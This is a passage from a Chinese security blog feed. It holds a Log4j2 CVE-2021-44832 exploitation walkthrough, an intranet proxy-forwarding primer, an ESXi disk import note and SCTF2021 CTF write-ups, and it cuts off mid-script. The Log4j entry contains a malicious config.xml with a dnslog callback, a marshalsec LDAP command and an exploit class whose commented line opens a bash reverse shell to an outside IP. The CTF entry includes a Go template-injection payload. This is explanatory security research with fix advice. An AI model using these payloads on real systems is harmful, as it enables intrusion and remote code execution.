&lt;groupId>commons-collections&lt;/groupId>--></span><span class="token comment">&lt;!--            &lt;artifactId>commons-collections&lt;/artifactId>--></span><span class="token comment">&lt;!--            &lt;version>3.1&lt;/version>--></span><span class="token comment">&lt;!--        &lt;/dependency>--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">></span></span></code></pre><p>这里直接借助<code>CVE-2021-44228 poc</code>来进行测试</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Log4j2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"log4j2.configurationFile"</span><span class="token punctuation">,</span><span class="token string">"http://192.168.1.81:8000/config.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.ldap.object.trustURLCodebase"</span><span class="token punctuation">,</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">Log4j2</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Scanner</span> sc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> str<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            str <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>本地提供一个<code>config.xml</code>的配置文件</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Configuration</span> <span class="token attr-name">status</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Appenders</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>JDBC</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>databaseAppender<span class="token punctuation">"</span></span> <span class="token attr-name">tableName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dbo.application_log<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DataSource</span> <span class="token attr-name">jndiName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dns://$&#123;env:COMPUTERNAME&#125;.mya9m5.dnslog.cn/exp<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Column</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>eventDate<span class="token punctuation">"</span></span> <span class="token attr-name">isEventTimestamp</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Column</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level<span class="token punctuation">"</span></span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>%level<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Column</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logger<span class="token punctuation">"</span></span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>%logger<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Column</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>%message<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Column</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>exception<span class="token punctuation">"</span></span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>%ex&#123;full&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>JDBC</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Appenders</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Loggers</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>warn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AppenderRef</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>databaseAppender<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Root</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Loggers</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Configuration</span><span class="token punctuation">></span></span></code></pre><p>运行后接收请求:</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229112453677.png" alt="image-20211229112453677"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>编写一个<code>exp</code>攻击，发起弹出计算机的命令，并且本地编译成恶意<code>class</code>类</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xpath<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>objects<span class="token punctuation">.</span></span><span class="token class-name">XString</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> exp <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// System.out.print("正在执行命令");</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Runtime</span> rt <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// String[] commands = &#123;"bash -i >&amp; /dev/tcp/139.196.234.164/5555 0>&amp;1"&#125;;</span>            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token class-name">Process</span> pc <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"正在执行命令"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>恶意exp类文件目录下开启简易http服务</p><pre class="language-bash" data-language="bash"><code class="language-bash">python3 -m http.server <span class="token number">8001</span></code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229113202656.png" alt="image-20211229113202656"></p><p>恶意config.xml文件目录下开启简易http服务</p><pre class="language-bash" data-language="bash"><code class="language-bash">python3 -m http.server </code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229113036815.png" alt="image-20211229113036815"></p><p>使用<code>marshalsec</code>启动恶意<code>ldap</code>服务</p><pre class="language-bash" data-language="bash"><code class="language-bash">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="token string">"http://192.168.1.81:8001/#exp"</span> <span class="token number">7788</span></code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229113202656.png"></p><p>修改<code>config.xml</code>文件<code>DataSource</code>为</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DataSource</span> <span class="token attr-name">jndiName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ldap://192.168.1.81:7788/exp<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><p>运行<code>Log4j2.java</code>触发恶意代码执行：</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229113604804.png" alt="image-20211229113604804"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>该漏洞利用之处比较鸡肋，你需要能够拥有修改本地<code>config</code>文件的权限才能达成对应的利用，因此其影响面相对较窄。但是出于安全考虑，还是建议将其更新至最新版本.</p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p><a href="https://logging.apache.org/log4j/2.x/security.html">https://logging.apache.org/log4j/2.x/security.html</a></p><p>将 <code>Apache Log4j2 </code>升级到 2.17.1、2.12.4 和 2.3.2 或更高版本。</p><h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><ul><li><a href="https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/">https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;前期&lt;code&gt;log4j2&lt;/code&gt;存在的远程代码执行漏洞&lt;code&gt;（CVE-2021-44228）&lt;/code&gt;引起了轩然大波。昨天上网冲浪发现，&lt;code&gt;checkmark&lt;/code&gt;研究员&lt;code&gt;YANIV NIZRY&lt;/co</summary>
      
    
    
    
    <category term="Security" scheme="http://www.greetdawn.top/categories/Security/"/>
    
    
    <category term="log4j2" scheme="http://www.greetdawn.top/tags/log4j2/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之代理转发</title>
    <link href="http://www.greetdawn.top/2021/12/28/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"/>
    <id>http://www.greetdawn.top/2021/12/28/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/</id>
    <published>2021-12-28T06:16:20.000Z</published>
    <updated>2021-12-28T09:27:17.760Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>在日常渗透测试过程中，当我们<code>getshell</code>一台边界主机后，经常需要借助边界主机实现对内网主机流量的转发和代理操作。这里可以使用一些代理脚本和转发工具将内网的流量代理和转发到本地进行访问，以方便我们后续内网渗透。这边着重介绍一下在内网渗透中常用的几种转发协议的特点和代理工具的使用。</p></blockquote><span id="more"></span><h2 id="代理的分类"><a href="#代理的分类" class="headerlink" title="代理的分类"></a>代理的分类</h2><h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>代理服务器位于客户端和服务端之间的一台服务器，且<code>proxy</code>和<code>client</code>同属于一个区域，对<code>server</code>是透明的；其作用是从目标服务器取得内容，客户端向代理服务器发送一个请求并指定目标，然后代理服务器向目标服务器转交请求并将获得的内容返回给客户端。（类似于现实生活中的中介）</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211228145340108.png" alt="image-20211228145340108"></p><p><strong>运行流程：</strong>客户端——请求——&gt; 代理服服务器——请求——&gt; 服务端</p><p><strong>代理特点：</strong></p><ul><li>客户端无法直接访问到服务端的目标应用，但是代理服务器可以。（典型场景：<code>FANQIANG</code>）</li><li>代理服务器帮助客户端请求页面并缓存在本地，并将页面返回到客户端</li><li>客户端需要设置代理服务器地址和端口（插件化），客户端知道代理服务器的存在</li><li>本质上代理服务器代理了客户端去和服务端请求交互的任务</li></ul><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>以代理服务器来接收网络连接请求，然后将请求转发给内部网络上的服务器，并将服务器上得到的结果返回给网络上请求连接的客户端。代理服务器和服务端共处于一个区域中，对客户端是透明的。</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211228160014598.png" alt="image-20211228160014598"></p><p><strong>代理特点：</strong></p><ul><li>客户端不清楚服务端是否存在代理服务器，以为请求的代理服务器就是真正的服务端</li><li>代理服务器将服务端页面缓存到本地，当客户端请求时直接返回给客户端</li><li>客户端无需任何配置，且不知道真实服务端的存在</li><li>应用场景：隐藏服务端真实<code>IP</code>、负载均衡、提高访问速度、增强安全性</li></ul><h2 id="代理工具"><a href="#代理工具" class="headerlink" title="代理工具"></a>代理工具</h2><h3 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a><code>lcx</code></h3>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;在日常渗透测试过程中，当我们&lt;code&gt;getshell&lt;/code&gt;一台边界主机后，经常需要借助边界主机实现对内网主机流量的转发和代理操作。这里可以使用一些代理脚本和转发工具将内网的流量代理和转发到本地进行访问，以方便我们后续内网渗透。这边着重介绍一下在内网渗透中常用的几种转发协议的特点和代理工具的使用。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://www.greetdawn.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="代理转发" scheme="http://www.greetdawn.top/tags/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>关于VMware磁盘镜像导入ESXi的方法</title>
    <link href="http://www.greetdawn.top/2021/12/27/config/%E5%85%B3%E4%BA%8EVMware%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F%E5%AF%BC%E5%85%A5ESXi%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://www.greetdawn.top/2021/12/27/config/%E5%85%B3%E4%BA%8EVMware%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F%E5%AF%BC%E5%85%A5ESXi%E7%9A%84%E6%96%B9%E6%B3%95/</id>
    <published>2021-12-27T06:15:17.000Z</published>
    <updated>2021-12-27T07:04:13.377Z</updated>
    
    <content type="html"><![CDATA[<h2 id="多磁盘格式"><a href="#多磁盘格式" class="headerlink" title="多磁盘格式"></a>多磁盘格式</h2><p>首先将多个磁盘进行合并处理，使用<code>vmware</code>自带的<code>vmware-vdiskmanager.exe</code>工具</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token string">"D:\InstallSoftware\VMware\VMware Workstation<span class="token entity" title="\v">\v</span>mware-vdiskmanager.exe"</span> -r <span class="token string">"Windows Server 2008 R2 x64.vmdk"</span> -t <span class="token number">0</span> ATT01-win2008.vmdk</code></pre><h2 id="单磁盘"><a href="#单磁盘" class="headerlink" title="单磁盘"></a>单磁盘</h2><p>单磁盘比较简单，直接找到虚拟机<code>vmdk</code>文件即可</p><h2 id="ESXi操作"><a href="#ESXi操作" class="headerlink" title="ESXi操作"></a><code>ESXi</code>操作</h2><p>首先创建一个对应镜像格式的虚拟机</p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211227144938346.png" alt="image-20211227144938346" style="zoom: 67%;" /><p>创建成功后，删除该镜像的默认<code>vmdk</code>文件</p><p>打开<code>ESXi</code>的ssh，使用<code>sftp</code>工具连接上传镜像文件</p><p>上传路径<code>/vmfs/volumes/datastore1/</code></p><p>由于<code>vmware</code>的磁盘镜像格式和<code>ESXi</code>的有所不同，需要使用<code>ESXi</code>的<code>vmkfstools</code>工具进行转换</p><p>转换生成的镜像名称和刚刚创建的虚拟机镜像名保持一致</p><pre class="language-bash" data-language="bash"><code class="language-bash">vmkfstools -i ATT01-win2008.vmdk ATT01-win2008R2.vmdk</code></pre><p>将转换后的磁盘移动到对应虚拟机的目录下</p><p>也可以先创建虚拟机，再上传磁盘到虚拟机目录下，再对其进行转换即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;多磁盘格式&quot;&gt;&lt;a href=&quot;#多磁盘格式&quot; class=&quot;headerlink&quot; title=&quot;多磁盘格式&quot;&gt;&lt;/a&gt;多磁盘格式&lt;/h2&gt;&lt;p&gt;首先将多个磁盘进行合并处理，使用&lt;code&gt;vmware&lt;/code&gt;自带的&lt;code&gt;vmware-vdiskma</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SCTF2021</title>
    <link href="http://www.greetdawn.top/2021/12/25/ctf/SCTF2021/"/>
    <id>http://www.greetdawn.top/2021/12/25/ctf/SCTF2021/</id>
    <published>2021-12-25T02:21:09.000Z</published>
    <updated>2021-12-27T03:24:49.599Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/rome1920.jpg"></p><span id="more"></span><p>团队在SCTF中喜获两枚<code>flag</code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="loginme"><a href="#loginme" class="headerlink" title="loginme"></a>loginme</h2><p>下载源码发现是go语言的web框架题</p><p>其实对go一点不熟，之前也没有学过，很难受，那就现场学习一下吧</p><p>首先需要本地登录</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211225102304811.png" alt="image-20211225102304811"></p><p>但是源码要求x-forwarded-for和x-client-ip均为空</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211225102411236.png" alt="image-20211225102411236"></p><p>搜gin模块ClientIP()的使用方法发现默认方法有[X-Forwarded-For, X-Real-Ip]</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211225102526951.png" alt="image-20211225102526951"></p><p>那直接构造请求包参数X-Real-Ip:127.0.0.1成功登录</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211225102652833.png" alt="image-20211225102652833"></p><p>分析route.go源码中Login方法逻辑保证传入id参数为0，可以取到admin的信息</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">Login</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>idString<span class="token punctuation">,</span> flag <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">GetQuery</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token operator">!</span>flag <span class="token punctuation">&#123;</span>idString <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">&#125;</span>id<span class="token punctuation">,</span> err <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>idString<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">&#125;</span>TargetUser <span class="token operator">:=</span> structs<span class="token punctuation">.</span>Admin<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> user <span class="token operator">:=</span> <span class="token keyword">range</span> structs<span class="token punctuation">.</span>Users <span class="token punctuation">&#123;</span><span class="token keyword">if</span> user<span class="token punctuation">.</span>Id <span class="token operator">==</span> id <span class="token punctuation">&#123;</span>TargetUser <span class="token operator">=</span> user<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>age <span class="token operator">:=</span> TargetUser<span class="token punctuation">.</span>Age<span class="token keyword">if</span> age <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>age<span class="token punctuation">,</span> flag <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">GetQuery</span><span class="token punctuation">(</span><span class="token string">"age"</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token operator">!</span>flag <span class="token punctuation">&#123;</span>age <span class="token operator">=</span> <span class="token string">"forever 18 (Tell me the age)"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>这里存在一个模板渲染函数，渲染参数为age支持用户自定义输入</p><pre class="language-gp" data-language="gp"><code class="language-gp">if err !&#x3D; nil &#123;c.AbortWithError(500, err)&#125;html :&#x3D; fmt.Sprintf(templates.AdminIndexTemplateHtml, age)if err !&#x3D; nil &#123;c.AbortWithError(500, err)&#125;tmpl, err :&#x3D; template.New(&quot;admin_index&quot;).Parse(html)if err !&#x3D; nil &#123;c.AbortWithError(500, err)&#125;tmpl.Execute(c.Writer, TargetUser)&#125;</code></pre><p>百度一下go模板渲染方式，其实跟python的ssti很像，于是构造<code>age=&#123;&#123;.&#125;&#125;</code>直接取出flag</p><p>最终<code>payload:?id=0&amp;age=&#123;&#123;.&#125;&#125;</code></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211225103210803.png" alt="image-20211225103210803"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="This-is-A-tree"><a href="#This-is-A-tree" class="headerlink" title="This_is_A_tree"></a>This_is_A_tree</h2><p>下载附件发现是二叉树</p><p>整理得到</p><p>左子树</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/1cscsacas.jpg" alt="1cscsacas"></p><p>右子树</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211225154423793.png" alt="image-20211225154423793"></p><p>按根节点-左节点-右节点的顺序遍历，并在又子树yEhO处分割，得到两断base64加密密文</p><p>Q2hpbmVzZSB0cmFkaXRpb25hbCBjdWx0dXJlIGlzIGJyb2FkIGFuZCBwcm9mb3VuZCEgU28gSSBXYW50IEdpdmUgWW91IE15IEZsYWcgQnV0IFlvdSBOZWVkIERlY29kZSBJdC5FbmpveSBUaGUgRmxhZyEh</p><p>OuW4iCDlhZEg5aSNIOaNnyDlt70g6ZyHIOaZiyDlp6Qg5aSn6L+HIOiuvCDlmazll5Eg6ZyHIOaBkiDoioIg6LGrIA==</p><p>解密得到：Chinese traditional culture is broad and profound! So I Want Give You My Flag But You Need Decode It.Enjoy The Flag!!:师 兑 复 损 巽 震 晋 姤 大过 讼 噬嗑 震 恒 节 豫</p><p>按伏羲六十四卦解密</p><p>exp</p><pre class="language-python" data-language="python"><code class="language-python">s<span class="token operator">=</span><span class="token string">'师兑复损巽震晋姤大过讼噬嗑震恒节豫'</span>dic<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'坤'</span><span class="token punctuation">:</span> <span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">:</span> <span class="token string">'000001'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">:</span> <span class="token string">'000010'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">:</span> <span class="token string">'000011'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">:</span> <span class="token string">'000100'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">:</span> <span class="token string">'000101'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">:</span> <span class="token string">'000110'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">:</span> <span class="token string">'000111'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">:</span> <span class="token string">'001000'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">:</span> <span class="token string">'001001'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">:</span> <span class="token string">'001010'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">:</span> <span class="token string">'001011'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">:</span> <span class="token string">'001100'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">:</span> <span class="token string">'001101'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">:</span> <span class="token string">'001110'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">:</span> <span class="token string">'001111'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">:</span> <span class="token string">'010000'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">:</span> <span class="token string">'010001'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">:</span> <span class="token string">'010010'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">:</span> <span class="token string">'010011'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">:</span> <span class="token string">'010100'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">:</span> <span class="token string">'010101'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">:</span> <span class="token string">'010110'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">:</span> <span class="token string">'010111'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">:</span> <span class="token string">'011000'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">:</span> <span class="token string">'011001'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">:</span> <span class="token string">'011010'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">:</span> <span class="token string">'011011'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">:</span> <span class="token string">'011100'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">:</span> <span class="token string">'011101'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">:</span> <span class="token string">'011110'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">:</span> <span class="token string">'011111'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">:</span> <span class="token string">'100000'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">:</span> <span class="token string">'100001'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">:</span> <span class="token string">'100010'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token 